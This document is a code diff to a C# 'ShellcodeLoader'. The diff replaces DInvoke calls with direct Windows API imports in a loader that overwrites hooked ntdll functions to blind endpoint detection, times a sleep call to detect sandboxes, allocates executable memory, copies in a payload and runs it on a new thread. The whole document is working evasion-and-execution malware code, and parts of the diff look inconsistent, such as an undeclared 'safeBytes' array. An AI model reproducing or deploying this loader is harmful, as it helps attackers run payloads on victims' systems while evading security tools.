@@ -5,41 +5,23 @@ using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
-using Data = DInvoke.Data;
-using DynamicInvoke = DInvoke.DynamicInvoke;
 
 namespace ShellcodeLoader
 {
-    public class Delegates
+    public class Imports
     {
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr Sleep(uint dwMilliseconds);
-        /* // Unused
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr GetCurrentProcess();
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr GetConsoleWindow();
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr LoadLibrary(string name);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate IntPtr MoveMemory(IntPtr dest, IntPtr src, int size);
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        public delegate void Void();
-        */
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref UInt32 NumberOfBytesToProtect, UInt32 NewAccessProtection, ref UInt32 OldAccessProtection);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll")]
+        public static extern void Sleep(uint dwMilliseconds);
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, UInt32 ZeroBits, ref UInt32 RegionSize, UInt32 AllocationType, UInt32 Protect);
+        [DllImport("kernel32", CharSet = CharSet.Ansi)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref IntPtr lpThreadId);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
     }
     partial class Unhooker
     {
@@ -97,28 +79,30 @@ namespace ShellcodeLoader
             {
                 byte* ptr = (byte*)func.Value;
                 IntPtr addr = func.Value;
-                IntPtr size = (IntPtr)16;
+                uint size = 16;
                 Console.Write("     |-> Remapping " + func.Key + ":");
-                IntPtr syscall = DynamicInvoke.Generic.GetSyscallStub(func.Key);
-                byte* syscall_ptr = (byte*)syscall;
                 Console.Write(" ==> Making memory writable");
-                uint oldProtect = DynamicInvoke.Native.NtProtectVirtualMemory(
+
+                uint oldProtect = 0;
+                Imports.NtProtectVirtualMemory(
                     proc.Handle,
                     ref addr,
                     ref size,
-                    Data.Win32.WinNT.PAGE_EXECUTE_READWRITE
+                    0x40,
+                    ref oldProtect
                 );
                 Console.Write(" ==> Rewriting original bytes");
-                for (int i = 0; i < 16; i++)
+                for (int i = 0; i < 4; i++)
                 {
-                    ptr[i] = syscall_ptr[i];
+                    ptr[i] = safeBytes[i];
                 }
                 Console.Write(" ==> Restoring memory protection");
-                DynamicInvoke.Native.NtProtectVirtualMemory(
+                Imports.NtProtectVirtualMemory(
                     proc.Handle,
                     ref addr,
                     ref size,
-                    oldProtect
+                    oldProtect,
+                    ref oldProtect
                 );
                 Console.WriteLine(" ==> UNHOOKED!");
             }
@@ -165,18 +149,21 @@ namespace ShellcodeLoader
             ProcessModule module = hProc.Modules.Cast<ProcessModule>().SingleOrDefault(m => string.Equals(m.ModuleName, "ntdll.dll", StringComparison.OrdinalIgnoreCase));
             return module?.BaseAddress ?? IntPtr.Zero;
         }
+        
+
 
         static IDictionary<string, IntPtr> GetFuncAddress(IntPtr hModule, string[] functions)
         {
             IDictionary<string, IntPtr> funcAddresses = new Dictionary<string, IntPtr>();
             foreach (string function in functions)
             {
-                try
+                IntPtr funcPtr = Imports.GetProcAddress(hModule, function);
+
+                if (funcPtr != IntPtr.Zero)
                 {
-                    IntPtr funcPtr = DynamicInvoke.Generic.GetExportAddress(hModule, function);
                     funcAddresses.Add(function, funcPtr);
                 }
-                catch (MissingMethodException)
+                else
                 {
                     Console.WriteLine("[-] Couldn't locate the address for {0}!", function);
                 }
@@ -188,7 +175,6 @@ namespace ShellcodeLoader
 
     class Program
     {
-
         public static byte[] StringToByteArray(string hex)
         {
             byte[] outr = new byte[(hex.Length / 2) + 1];
@@ -417,8 +403,7 @@ namespace ShellcodeLoader
 
             // Detect EDR
             DateTime t1 = DateTime.Now;
-            object[] parameters = { (uint)2000 };
-            DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Delegates.Sleep), ref parameters);
+            Imports.Sleep(2000);
             double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
             if (t2 < 1.5)
             {
@@ -446,8 +431,8 @@ namespace ShellcodeLoader
             };
 
             IntPtr addr = IntPtr.Zero;
-            IntPtr region_size = (IntPtr)payloadSize;
-            DynamicInvoke.Native.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref region_size, (uint)0x3000, (uint)0x40);
+            uint region_size = payloadSize;
+            Imports.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, 0, ref region_size, (uint)0x3000, (uint)0x40);
 
             if (addr == IntPtr.Zero)
             {
@@ -478,8 +463,7 @@ namespace ShellcodeLoader
             // Launch
             Console.WriteLine("Starting thread.");
             IntPtr threadId = IntPtr.Zero;
-            IntPtr hThread = DynamicInvoke.Win32.CreateRemoteThread(
-                Process.GetCurrentProcess().Handle,
+            IntPtr hThread = Imports.CreateThread(
                 IntPtr.Zero,
                 0,
                 addr,
@@ -490,12 +474,7 @@ namespace ShellcodeLoader
 
             Console.WriteLine("Executing shellcode now!");
             Console.WriteLine();
-            object[] wait_parameters = new object[]
-            {
-            hThread,
-            0xFFFFFFFF
-            };
-            DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "WaitForSingleObject", typeof(Delegates.WaitForSingleObject), ref wait_parameters);
+            Imports.WaitForSingleObject(hThread, UInt32.MaxValue);
             Console.WriteLine("DONE!");
             return 0;
         }
